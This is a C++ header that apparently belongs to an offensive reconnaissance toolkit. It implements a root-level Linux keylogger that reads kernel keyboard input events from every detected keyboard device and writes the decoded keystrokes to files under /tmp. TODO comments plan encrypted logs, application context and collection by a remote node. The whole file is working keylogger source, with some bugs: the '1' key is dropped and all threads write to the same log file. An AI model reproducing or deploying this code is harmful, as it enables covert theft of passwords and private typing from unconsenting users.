#pragma once

#include <dirent.h>
#include <fcntl.h>
#include <fstream>
#include <ios>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <thread>
#include <unistd.h>

// TODO: Support other OSes and remove me
#define LINUX

#ifdef LINUX
#include <linux/input.h>
#endif

#include <log/log.h>

#include "../../util/privs.h"

/* TODO: Modify captures to adhere to this when application context and device enumeration done
Captures should look like the following:

log_event = {
    time when;
    string user;
    string application;
    int proceoutfile_id;
    // TODO: Implement begin/end symbol for modifier sequences
    vector<u8> key_stream;
}
*/

using std::ios;
using std::ofstream;
using std::thread;

// TODO: Write testing to ensure all keys/modifier combos are handled correctly against outfile.
//       Use linux/input headers to send keyboard input programatically.
namespace recon
{
    namespace collect
    {
        // TODO: Encrypt logging
        // TODO: Find active application context if using X
        // TODO: Use mouse/interesting applications for more context if using X
        /// Keylogger that uses kernel input events to write log
        class keylogger
        {
          private:
            enum { RELEASED, PRESSED, REPEATED };

            /**
             * Handle state of capslock/shift presses
             * @param shift_modifier: state of shift key
             * @param caps_lock: state of caps lock key
             * @param lower: unmodified version
             * @param higher: modified version
             * @return modified or unmodified character
             */
            static inline char handle_capitalization(bool shift_modifier, bool caps_lock, char lower,
                                                     char upper)
            {
                return (!shift_modifier && !caps_lock) || (caps_lock && shift_modifier) ? lower : upper;
            }

            static int enumerate_devices(vector<string>& devices)
            {
                string path = "/dev/input/by-path/";
                DIR* dp = opendir(path.c_str());
                string suffix = "event-kbd";

                if (dp == NULL) {
                    log::error("opendir() path does not exist or could not be read");
                    return -1;
                }

                struct dirent* entry;
                while ((entry = readdir(dp))) {
                    string entry_str(entry->d_name);

                    if (entry_str.size() >= suffix.size() &&
                        entry_str.compare(entry_str.size() - suffix.size(), suffix.size(), suffix) == 0) {
                        devices.push_back(path + entry_str);
                    }
                }

                closedir(dp);
                return 0;
            }

            /**
             * Thread handler for individual keyboard devices
             * @param device: the device path for the keyboard
             * @param outfile: the log location
             */
            static void device_handler(const string& device, const string& logfile)
            {
                log::info(device);

                int file_descriptor;
                struct input_event prev;
                struct input_event event;
                bool exit_loop = false;
                bool shift_modifier = false;
                bool caps_lock = false;
                ofstream outfile;

                if ((file_descriptor = open(device.c_str(), O_RDONLY)) == -1) {
                    log::warn("Unable to open keyboard device %s", device.c_str());
                    return;
                }

                outfile.open(logfile, ios::out | ios::trunc);

                // TODO: Convert to enumeration values instead of strings and store modifiers/same context
                //       as a sequence of events in 0-255 to be decoded on collection node
                do {
                    prev = event;
                    read(file_descriptor, &event, sizeof(event));

                    // 0 = Released (shift only right now), 1 = Pressed, 2 = Repeated
                    if (event.type == EV_KEY && event.value == PRESSED) {
                        switch (event.code) {
                            case KEY_LEFTSHIFT:
                            case KEY_RIGHTSHIFT:
                                shift_modifier = true;
                                break;
                            case KEY_CAPSLOCK:
                                caps_lock = !caps_lock;
                                outfile << "<CAPS>";
                                break;
                            case KEY_GRAVE:
                                outfile << handle_capitalization(shift_modifier, caps_lock, '`', '~');
                                break;
                            case KEY_KP0:
                            case KEY_0:
                                outfile << handle_capitalization(shift_modifier, caps_lock, '0', ')');
                                break;
                            case KEY_KP1:
                                outfile << "1";
                                break;
                            case KEY_1:
                                break;
                            case KEY_KP2:
                                outfile << "2";
                                break;
                            case KEY_2:
                                outfile << handle_capitalization(shift_modifier, caps_lock, '2', '@');
                                break;
                            case KEY_KP3:
                                outfile << "3";
                                break;
                            case KEY_3:
                                outfile << handle_capitalization(shift_modifier, caps_lock, '3', '#');
                                break;
                            case KEY_KP4:
                                outfile << "4";
                                break;
                            case KEY_4:
                                outfile << handle_capitalization(shift_modifier, caps_lock, '4', '$');
                                break;
                            case KEY_KP5:
                                outfile << "5";
                                break;
                            case KEY_5:
                                outfile << handle_capitalization(shift_modifier, caps_lock, '5', '%');
                                break;
                            case KEY_KP6:
                                outfile << "6";
                                break;
                            case KEY_6:
                                outfile << handle_capitalization(shift_modifier, caps_lock, '6', '^');
                                break;
                            case KEY_KP7:
                                outfile << "7";
                                break;
                            case KEY_7:
                                outfile << handle_capitalization(shift_modifier, caps_lock, '7', '&');
                                break;
                            case KEY_KP8:
                                outfile << "8";
                                break;
                            case KEY_8:
                                outfile << handle_capitalization(shift_modifier, caps_lock, '8', '*');
                                break;
                            case KEY_KP9:
                                outfile << "9";
                                break;
                            case KEY_9:
                                outfile << handle_capitalization(shift_modifier, caps_lock, '9', '(');
                                break;
                            case KEY_A:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'a', 'A');
                                break;
                            case KEY_B:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'b', 'B');
                                break;
                            case KEY_C:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'c', 'C');
                                break;
                            case KEY_D:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'd', 'D');
                                break;
                            case KEY_E:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'e', 'E');
                                break;
                            case KEY_F:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'f', 'F');
                                break;
                            case KEY_G:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'g', 'G');
                                break;
                            case KEY_H:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'h', 'H');
                                break;
                            case KEY_I:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'i', 'I');
                                break;
                            case KEY_J:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'j', 'J');
                                break;
                            case KEY_K:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'k', 'K');
                                break;
                            case KEY_L:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'l', 'L');
                                break;
                            case KEY_M:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'm', 'M');
                                break;
                            case KEY_N:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'n', 'N');
                                break;
                            case KEY_O:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'o', 'O');
                                break;
                            case KEY_P:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'p', 'P');
                                break;
                            case KEY_Q:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'q', 'Q');
                                break;
                            case KEY_R:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'r', 'R');
                                break;
                            case KEY_S:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 's', 'S');
                                break;
                            case KEY_T:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 't', 'T');
                                break;
                            case KEY_U:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'u', 'U');
                                break;
                            case KEY_V:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'v', 'V');
                                break;
                            case KEY_W:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'w', 'W');
                                break;
                            case KEY_X:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'x', 'X');
                                break;
                            case KEY_Y:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'y', 'Y');
                                break;
                            case KEY_Z:
                                outfile << handle_capitalization(shift_modifier, caps_lock, 'z', 'Z');
                                break;
                            case KEY_MINUS:
                                outfile << handle_capitalization(shift_modifier, caps_lock, '-', '_');
                                break;
                            case KEY_EQUAL:
                                outfile << handle_capitalization(shift_modifier, caps_lock, '=', '+');
                                break;
                            case KEY_BACKSPACE:
                                outfile << "<BKSPACE>";
                                break;
                            case KEY_TAB:
                                outfile << "<TAB>";
                                break;
                            case KEY_LEFTBRACE:
                                outfile << handle_capitalization(shift_modifier, caps_lock, '[', '{');
                                break;
                            case KEY_RIGHTBRACE:
                                outfile << handle_capitalization(shift_modifier, caps_lock, ']', '}');
                                break;
                            case KEY_KPENTER:
                            case KEY_LINEFEED:
                            case KEY_ENTER:
                                outfile << "\n";
                                break;
                            case KEY_RIGHTCTRL:
                            case KEY_LEFTCTRL:
                                outfile << "<CTRL>";
                                break;
                            case KEY_SEMICOLON:
                                outfile << handle_capitalization(shift_modifier, caps_lock, ';', ':');
                                break;
                            case KEY_APOSTROPHE:
                                outfile << handle_capitalization(shift_modifier, caps_lock, '\'', '"');
                                break;
                            case KEY_BACKSLASH:
                                outfile << handle_capitalization(shift_modifier, caps_lock, '\\', '|');
                                break;
                            case KEY_COMMA:
                                outfile << handle_capitalization(shift_modifier, caps_lock, ',', '<');
                                break;
                            case KEY_DOT:
                                outfile << handle_capitalization(shift_modifier, caps_lock, '.', '>');
                                break;
                            case KEY_SLASH:
                                outfile << handle_capitalization(shift_modifier, caps_lock, '/', '?');
                                break;
                            case KEY_SPACE:
                                outfile << " ";
                                break;
                            case KEY_RIGHTALT:
                            case KEY_LEFTALT:
                                outfile << "<ALT>";
                                break;
                            case KEY_LEFTMETA:
                            case KEY_RIGHTMETA:
                                outfile << "<META>";
                                break;
                            case KEY_HOME:
                                outfile << "<HOME>";
                                break;
                            case KEY_UP:
                                outfile << "<UP>";
                                break;
                            case KEY_LEFT:
                                outfile << "<LEFT>";
                                break;
                            case KEY_RIGHT:
                                outfile << "<RIGHT>";
                                break;
                            case KEY_END:
                                outfile << "<END>";
                                break;
                            case KEY_DOWN:
                                outfile << "<DOWN>";
                                break;
                            case KEY_INSERT:
                                outfile << "<INS>";
                                break;
                            case KEY_DELETE:
                                outfile << "<DEL>";
                                break;
                            case KEY_F1:
                                outfile << "<F1>";
                                break;
                            case KEY_F2:
                                outfile << "<F2>";
                                break;
                            case KEY_F3:
                                outfile << "<F3>";
                                break;
                            case KEY_F4:
                                outfile << "<F4>";
                                break;
                            case KEY_F5:
                                outfile << "<F5>";
                                break;
                            case KEY_F6:
                                outfile << "<F6>";
                                break;
                            case KEY_F7:
                                outfile << "<F7>";
                                break;
                            case KEY_F8:
                                outfile << "<F8>";
                                break;
                            case KEY_F9:
                                outfile << "<F9>";
                                break;
                            case KEY_F11:
                                outfile << "<F11>";
                                break;
                            case KEY_F12:
                                outfile << "<F12>";
                                break;
                            case KEY_KPPLUSMINUS:
                                outfile << "<KP +/->";
                                break;
                            case KEY_KPCOMMA:
                                outfile << ",";
                                break;
                            case KEY_KPMINUS:
                                outfile << "-";
                                break;
                            case KEY_KPDOT:
                                outfile << ".";
                                break;
                            case KEY_KPASTERISK:
                                outfile << "*";
                                break;
                            case KEY_KPSLASH:
                                outfile << "/";
                                break;
                            // FIXME: Remove when out of development
                            case KEY_ESC:
                                exit_loop = true;
                                break;
                            default:
                                break;
                        }
                    } else if (event.type == EV_KEY && event.value == RELEASED &&
                               (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT)) {
                        shift_modifier = false;
                    }

                    // Immediately flush contents to logfile
                    outfile.flush();
                } while (!exit_loop);

                outfile.close();
                close(file_descriptor);
                fflush(stdout);
            }

          public:
            /**
             * Log running host's keystrokes to file using kernel's input_events
             * @param file: keylog output file
             */
            static int keylog()
            {
                // TODO: Use X window system for keylogging if not root and in DE (does wayland change this
                // behavior?)
                if (!is_privileged_user())
                    log::fatal("Keylogger must be run as root");

#ifdef LINUX
                vector<string> devices;
                enumerate_devices(devices);

                // Create separate thread/log for every enumerated device
                // Devices not currently being used will not create files

                // TODO: Identify log by device instead of numbering
                string prefix = "/tmp/keylog";
                vector<thread> threads;
                int i = 0;
                for (const string& device : devices) {
                    stringstream ss;
                    ss << prefix << i;
                    threads.push_back(thread(device_handler, device, ss.str()));
                }

                for (thread& th : threads) {
                    th.join();
                }

                return 0;
#else
                return EXIT_FAILURE;
#endif
            }
        }; // namespace collect
    }      // namespace collect
} // namespace recon
